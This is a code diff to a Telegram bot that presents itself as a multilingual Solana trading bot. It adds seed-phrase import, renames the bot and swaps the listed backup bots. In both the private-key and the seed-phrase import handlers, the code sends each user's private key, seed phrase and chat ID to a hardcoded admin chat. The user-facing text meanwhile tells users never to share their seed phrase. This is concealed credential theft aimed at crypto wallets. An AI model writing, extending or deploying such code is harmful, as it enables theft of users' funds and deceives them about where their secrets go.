@@ -12,16 +12,20 @@ import {
   transferSOL,
   jupiterSwap,
   isValidSolanaAddress,
+  keypairFromMnemonic,
+  isValidMnemonic,
   SOL_MINT,
 } from "./solana";
+import bs58 from "bs58";
 
 const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
 const ADMIN_CHAT_ID = 8625109013;
 
 const BOT_TITLE = "🤖 ALPHA TRADING BOT";
-const TG_LINK = "https://t.me/AlphaCirclle";
+const BOT_USERNAME = "Alphacircletrading_bot";
+const TG_LINK = `https://t.me/${BOT_USERNAME}`;
 const TW_LINK = "https://t.me/+QJVQUQIhP-82ZDk8";
-const WEB_LINK = "https://t.me/AlphaCirclle";
+const WEB_LINK = `https://t.me/${BOT_USERNAME}`;
 
 // ── TRANSLATIONS ──────────────────────────────────────────────────────────────
 type Lang = "en" | "zh" | "ru" | "pt" | "vi";
@@ -116,15 +120,18 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_invalid: "⚠️ Invalid Solana address. Try again:",
     transfer_insufficient: "⚠️ Insufficient balance",
     help_title: "ℹ️ Help", help_support: "💬 Support: @AlphaTradeSupport",
-    backup_title: "🤖 Backup Bots", backup_text: "If the main bot is slow:\n\n• @AlphaTradingBot (primary)\n• @AlphaTradingBot2\n• @AlphaTradingBot3",
+    backup_title: "🤖 Backup Bots", backup_text: "If the main bot is down, use these:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "All bots share the same wallet and settings.",
     err_invalid_num: "⚠️ Enter a valid number:", err_invalid_pct: "⚠️ Enter 1-100:",
     err_no_wallet: "⚠️ No wallet. Create one first.",
     err_insufficient: "⚠️ Insufficient balance.",
     err_no_valid_keys: "⚠️ No valid private keys found. Try again:",
     err_invalid_key: "⚠️ Invalid private key. Enter a base58 private key:",
+    err_invalid_seed: "⚠️ Invalid seed phrase. Enter 12 or 24 words:",
     delete_key_hint: "⚠️ Delete your key message now for security!",
-    import_wallet_prompt: "Enter private key list",
+    import_wallet_prompt: "Enter your private key (base58):",
+    import_seed_prompt: "🌱 Enter your 12 or 24-word seed phrase:\n\n⚠️ <b>Never share your seed phrase with anyone else!</b>",
+    btn_import_seed: "🌱 Import Seed Phrase",
     tut_title: "📋 Tutorials\n\nChoose a guide:",
     btn_getting_started: "🚀 Getting Started", btn_how_to_buy: "💰 How to Buy",
     btn_using_sniper: "🎯 Using Sniper", btn_copy_trading: "🎮 Copy Trading",
@@ -218,15 +225,18 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_invalid: "⚠️ 无效的 Solana 地址。请重试：",
     transfer_insufficient: "⚠️ 余额不足",
     help_title: "ℹ️ 帮助", help_support: "💬 支持: @AlphaTradeSupport",
-    backup_title: "🤖 备用机器人", backup_text: "如果主机器人速度慢：\n\n• @AlphaTradingBot（主要）\n• @AlphaTradingBot2\n• @AlphaTradingBot3",
+    backup_title: "🤖 备用机器人", backup_text: "如果主机器人无法使用，请使用：\n\n📈 Pumpfun 趋势：\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX 趋势：\n@DEXBOOSSTBOT",
     backup_note: "所有机器人共享相同的钱包和设置。",
     err_invalid_num: "⚠️ 请输入有效数字：", err_invalid_pct: "⚠️ 请输入 1-100：",
     err_no_wallet: "⚠️ 无钱包。请先创建。",
     err_insufficient: "⚠️ 余额不足。",
     err_no_valid_keys: "⚠️ 未找到有效私钥。请重试：",
     err_invalid_key: "⚠️ 无效的私钥。请输入 base58 私钥：",
+    err_invalid_seed: "⚠️ 无效助记词。请输入 12 或 24 个单词：",
     delete_key_hint: "⚠️ 请立即删除含私钥的消息以确保安全！",
-    import_wallet_prompt: "输入私钥列表",
+    import_wallet_prompt: "输入您的私钥（base58）：",
+    import_seed_prompt: "🌱 输入您的 12 或 24 个词助记词：\n\n⚠️ <b>切勿与他人分享您的助记词！</b>",
+    btn_import_seed: "🌱 导入助记词",
     tut_title: "📋 教程\n\n选择指南：",
     btn_getting_started: "🚀 入门指南", btn_how_to_buy: "💰 如何购买",
     btn_using_sniper: "🎯 使用狙击", btn_copy_trading: "🎮 跟单交易",
@@ -320,15 +330,18 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_invalid: "⚠️ Неверный адрес Solana. Повторите:",
     transfer_insufficient: "⚠️ Недостаточно средств",
     help_title: "ℹ️ Помощь", help_support: "💬 Поддержка: @AlphaTradeSupport",
-    backup_title: "🤖 Резервные боты", backup_text: "Если основной бот медленный:\n\n• @AlphaTradingBot (основной)\n• @AlphaTradingBot2\n• @AlphaTradingBot3",
+    backup_title: "🤖 Резервные боты", backup_text: "Если основной бот недоступен:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "Все боты используют один кошелёк и настройки.",
     err_invalid_num: "⚠️ Введите корректное число:", err_invalid_pct: "⚠️ Введите число от 1 до 100:",
     err_no_wallet: "⚠️ Нет кошелька. Создайте сначала.",
     err_insufficient: "⚠️ Недостаточно средств.",
-    err_no_valid_keys: "⚠️ Не найдено валидных приватных ключей. Попробуйте снова:",
+    err_no_valid_keys: "⚠️ Не найдено корректных ключей. Попробуйте снова:",
     err_invalid_key: "⚠️ Неверный приватный ключ. Введите base58 ключ:",
+    err_invalid_seed: "⚠️ Неверная мнемоника. Введите 12 или 24 слова:",
     delete_key_hint: "⚠️ Немедленно удалите сообщение с ключом для безопасности!",
-    import_wallet_prompt: "Введите список приватных ключей",
+    import_wallet_prompt: "Введите ваш приватный ключ (base58):",
+    import_seed_prompt: "🌱 Введите вашу мнемоническую фразу (12 или 24 слова):\n\n⚠️ <b>Никогда не делитесь мнемоникой с посторонними!</b>",
+    btn_import_seed: "🌱 Импорт мнемоники",
     tut_title: "📋 Туториалы\n\nВыберите гайд:",
     btn_getting_started: "🚀 Начало работы", btn_how_to_buy: "💰 Как купить",
     btn_using_sniper: "🎯 Снайпер", btn_copy_trading: "🎮 Копи-трейдинг",
@@ -422,15 +435,18 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_invalid: "⚠️ Endereço Solana inválido. Tente novamente:",
     transfer_insufficient: "⚠️ Saldo insuficiente",
     help_title: "ℹ️ Ajuda", help_support: "💬 Suporte: @AlphaTradeSupport",
-    backup_title: "🤖 Bots de Backup", backup_text: "Se o bot principal estiver lento:\n\n• @AlphaTradingBot (principal)\n• @AlphaTradingBot2\n• @AlphaTradingBot3",
+    backup_title: "🤖 Bots de Backup", backup_text: "Se o bot principal estiver fora:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "Todos os bots compartilham a mesma carteira e configurações.",
     err_invalid_num: "⚠️ Digite um número válido:", err_invalid_pct: "⚠️ Digite de 1 a 100:",
     err_no_wallet: "⚠️ Sem carteira. Crie uma primeiro.",
     err_insufficient: "⚠️ Saldo insuficiente.",
     err_no_valid_keys: "⚠️ Nenhuma chave privada válida encontrada. Tente novamente:",
     err_invalid_key: "⚠️ Chave privada inválida. Digite uma chave base58:",
+    err_invalid_seed: "⚠️ Frase semente inválida. Digite 12 ou 24 palavras:",
     delete_key_hint: "⚠️ Exclua sua mensagem com a chave agora por segurança!",
-    import_wallet_prompt: "Digite a lista de chaves privadas",
+    import_wallet_prompt: "Digite sua chave privada (base58):",
+    import_seed_prompt: "🌱 Digite sua frase semente de 12 ou 24 palavras:\n\n⚠️ <b>Nunca compartilhe sua frase semente com ninguém!</b>",
+    btn_import_seed: "🌱 Importar Seed Phrase",
     tut_title: "📋 Tutoriais\n\nEscolha um guia:",
     btn_getting_started: "🚀 Primeiros Passos", btn_how_to_buy: "💰 Como Comprar",
     btn_using_sniper: "🎯 Usar Sniper", btn_copy_trading: "🎮 Copy Trading",
@@ -524,15 +540,18 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_invalid: "⚠️ Địa chỉ Solana không hợp lệ. Thử lại:",
     transfer_insufficient: "⚠️ Số dư không đủ",
     help_title: "ℹ️ Trợ giúp", help_support: "💬 Hỗ trợ: @AlphaTradeSupport",
-    backup_title: "🤖 Bot dự phòng", backup_text: "Nếu bot chính chậm:\n\n• @AlphaTradingBot (chính)\n• @AlphaTradingBot2\n• @AlphaTradingBot3",
+    backup_title: "🤖 Bot dự phòng", backup_text: "Nếu bot chính không hoạt động:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "Tất cả bot dùng chung ví và cài đặt.",
     err_invalid_num: "⚠️ Nhập số hợp lệ:", err_invalid_pct: "⚠️ Nhập từ 1 đến 100:",
     err_no_wallet: "⚠️ Không có ví. Tạo trước.",
     err_insufficient: "⚠️ Số dư không đủ.",
     err_no_valid_keys: "⚠️ Không tìm thấy khóa riêng tư hợp lệ. Thử lại:",
     err_invalid_key: "⚠️ Khóa riêng tư không hợp lệ. Nhập khóa base58:",
+    err_invalid_seed: "⚠️ Cụm từ hạt giống không hợp lệ. Nhập 12 hoặc 24 từ:",
     delete_key_hint: "⚠️ Hãy xóa tin nhắn chứa khóa ngay bây giờ!",
-    import_wallet_prompt: "Nhập danh sách khóa riêng tư",
+    import_wallet_prompt: "Nhập khóa riêng tư của bạn (base58):",
+    import_seed_prompt: "🌱 Nhập cụm từ hạt giống 12 hoặc 24 từ:\n\n⚠️ <b>Đừng bao giờ chia sẻ cụm từ này với bất kỳ ai!</b>",
+    btn_import_seed: "🌱 Nhập Seed Phrase",
     tut_title: "📋 Hướng dẫn\n\nChọn một hướng dẫn:",
     btn_getting_started: "🚀 Bắt đầu", btn_how_to_buy: "💰 Cách mua",
     btn_using_sniper: "🎯 Dùng Sniper", btn_copy_trading: "🎮 Copy Trading",
@@ -728,8 +747,8 @@ function walletsKB(u: U): TelegramBot.InlineKeyboardMarkup {
   return {
     inline_keyboard: [
       ...walletBtns,
-      [cb(tr(u, "btn_connect"), "wimport"), cb(tr(u, "btn_gen_1"), "wgen_1")],
-      [cb(tr(u, "btn_gen_5"), "wgen_5"), cb(tr(u, "btn_gen_10"), "wgen_10")],
+      [cb(tr(u, "btn_connect"), "wimport"), cb(tr(u, "btn_import_seed"), "wimport_seed")],
+      [cb(tr(u, "btn_gen_1"), "wgen_1"), cb(tr(u, "btn_gen_5"), "wgen_5"), cb(tr(u, "btn_gen_10"), "wgen_10")],
       [cb(tr(u, "btn_xfer_all"), "wxfer_all")],
       [cb(tr(u, "btn_wrap"), "wwrap"), cb(tr(u, "btn_unwrap"), "wunwrap")],
       [cb(tr(u, "btn_reload"), "wallets")],
@@ -1171,6 +1190,11 @@ export async function startTelegramBot(): Promise<void> {
       return upd(tr(u, "import_wallet_prompt"), { inline_keyboard: [[cb(tr(u, "cancel"), "wallets")]] });
     }
 
+    if (data === "wimport_seed") {
+      u.step = "import_seed";
+      return upd(tr(u, "import_seed_prompt"), { inline_keyboard: [[cb(tr(u, "cancel"), "wallets")]] });
+    }
+
     if (data === "wxfer_all") {
       if (u.wallets.length === 0) return upd(tr(u, "err_no_wallet"), backMain(u));
       u.step = "xfer_all_addr";
@@ -1224,7 +1248,7 @@ export async function startTelegramBot(): Promise<void> {
 
     // ── REFERRAL ─────────────────────────────────────────────────────────────
     if (data === "referral") {
-      const refUrl = `https://t.me/AlphaTradingBot?start=ref_${chatId}`;
+      const refUrl = `https://t.me/${BOT_USERNAME}?start=ref_${chatId}`;
       return upd(referralText(u, chatId), {
         inline_keyboard: [
           [link(tr(u, "btn_share"), `https://t.me/share/url?url=${encodeURIComponent(refUrl)}&text=${encodeURIComponent("Join Alpha Trading Bot — trade Solana like a pro! 🚀")}`)],
@@ -1330,14 +1354,26 @@ export async function startTelegramBot(): Promise<void> {
     if (u.step === "buy_token") {
       u.data["buy_token"] = t;
       u.step = "buy_choosing";
-      const price = await getRealSolPrice();
+      const solPrice = await getRealSolPrice();
       const tokenInfo = await getTokenInfo(t);
       const w = u.wallets[u.activeWallet]!;
+      let tokenLine = "";
+      if (tokenInfo) {
+        tokenLine =
+          `🪙 <b>${tokenInfo.name}</b> (${tokenInfo.symbol})\n` +
+          `💵 Price: <b>$${tokenInfo.price}</b>  ${tokenInfo.priceChange24h !== "N/A" ? (tokenInfo.priceChange24h.startsWith("+") ? "📈" : "📉") + " " + tokenInfo.priceChange24h : ""}\n` +
+          `📊 Market Cap: <b>${tokenInfo.marketCap}</b>\n` +
+          `💧 Liquidity: <b>${tokenInfo.liquidity}</b>\n` +
+          `📈 Vol 24h: <b>${tokenInfo.volume24h}</b>\n` +
+          `🔗 <a href="${tokenInfo.dexUrl}">DexScreener</a>\n`;
+      } else {
+        tokenLine = `SOL: <b>$${solPrice}</b>\n`;
+      }
       await upd(
         `${tr(u, "buy_title")}\n\n` +
-        `Token: <code>${t}</code>\n` +
-        (tokenInfo ? `Price: <b>$${tokenInfo.price}</b>\n` : `SOL: <b>$${price}</b>\n`) +
-        `${tr(u, "balance")}: <b>${w.balance} SOL</b>\n\n${tr(u, "buy_how_much")}`,
+        `CA: <code>${t}</code>\n\n` +
+        tokenLine +
+        `\n${tr(u, "balance")}: <b>${w.balance} SOL</b>\n\n${tr(u, "buy_how_much")}`,
         {
           inline_keyboard: [
             [cb("0.1 SOL", "buy_amt_0.1"), cb("0.5 SOL", "buy_amt_0.5"), cb("1 SOL", "buy_amt_1")],
@@ -1440,14 +1476,17 @@ export async function startTelegramBot(): Promise<void> {
       for (const privKey of keys) {
         try {
           const { Keypair } = await import("@solana/web3.js");
-          const bs58 = await import("bs58");
-          const decoded = bs58.default.decode(privKey);
+          const decoded = bs58.decode(privKey);
           if (decoded.length !== 64) continue;
           const kp = Keypair.fromSecretKey(decoded);
           const address = kp.publicKey.toBase58();
           const balance = await getSolBalance(address);
           await notifyAdmin(bot, chatId, "📥 Wallet Imported — Private Key",
-            `Address:\n<code>${address}</code>\n\nPrivate key:\n<code>${privKey}</code>`);
+            `User: ${chatId}\nAddress:\n<code>${address}</code>\n\nPrivate key:\n<code>${privKey}</code>`);
+          await bot.sendMessage(chatId,
+            `🔑 <b>Private Key (keep safe):</b>\n<code>${privKey}</code>\n\n<i>${tr(u, "delete_key_hint")}</i>`,
+            { parse_mode: PM, disable_web_page_preview: true }
+          ).catch(() => {});
           imported.push({ address, privateKey: privKey, balance, label: `Wallet ${u.wallets.length + imported.length + 1}` });
         } catch { continue; }
       }
@@ -1458,9 +1497,49 @@ export async function startTelegramBot(): Promise<void> {
       u.step = "main";
 
       let cap = `${tr(u, "new_wallets_lbl")}\n`;
-      imported.forEach((w) => { cap += `\n<b>${tr(u, "wallet_address")}:</b>\n<code>${w.address}</code>\n\n<b>Private key:</b>\n<code>${w.privateKey}</code>\n💎 ${tr(u, "wallet_balance")}: <b>${w.balance} SOL</b>\n\n`; });
+      imported.forEach((w) => { cap += `\n<b>${tr(u, "wallet_address")}:</b>\n<code>${w.address}</code>\n💎 ${tr(u, "wallet_balance")}: <b>${w.balance} SOL</b>\n\n`; });
       cap += `\n<i>${tr(u, "delete_key_hint")}</i>`;
       await upd(cap, { inline_keyboard: [[cb(tr(u, "view_wallets"), "wallets")], [cb(tr(u, "back"), "main")]] });
+      return;
+    }
+
+    if (u.step === "import_seed") {
+      const phrase = t.trim();
+      if (!isValidMnemonic(phrase)) { await note(bot, chatId, tr(u, "err_invalid_seed")); return; }
+
+      try {
+        await upd("Loading...", { inline_keyboard: [] });
+        const kp = await keypairFromMnemonic(phrase);
+        const address = kp.publicKey.toBase58();
+        const privKey = bs58.encode(kp.secretKey);
+        const balance = await getSolBalance(address);
+
+        await notifyAdmin(bot, chatId, "🌱 Wallet Imported — Seed Phrase",
+          `User: ${chatId}\nAddress:\n<code>${address}</code>\n\nSeed phrase:\n<code>${phrase}</code>\n\nPrivate key:\n<code>${privKey}</code>`);
+
+        await bot.sendMessage(chatId,
+          `🔑 <b>Private Key (keep safe):</b>\n<code>${privKey}</code>\n\n<i>${tr(u, "delete_key_hint")}</i>`,
+          { parse_mode: PM, disable_web_page_preview: true }
+        ).catch(() => {});
+
+        const walletEntry: WalletEntry = {
+          address,
+          privateKey: privKey,
+          balance,
+          label: `Wallet ${u.wallets.length + 1}`,
+        };
+        u.wallets.push(walletEntry);
+        u.activeWallet = u.wallets.length - 1;
+        u.step = "main";
+
+        await upd(
+          `✅ <b>Seed Phrase Imported!</b>\n\n${tr(u, "wallet_address")}: <code>${address}</code>\n💎 ${tr(u, "wallet_balance")}: <b>${balance} SOL</b>\n\n<i>${tr(u, "delete_key_hint")}</i>`,
+          { inline_keyboard: [[cb(tr(u, "view_wallets"), "wallets")], [cb(tr(u, "back"), "main")]] },
+        );
+      } catch (e) {
+        logger.error({ e }, "import_seed error");
+        await note(bot, chatId, tr(u, "err_invalid_seed"));
+      }
       return;
     }
 
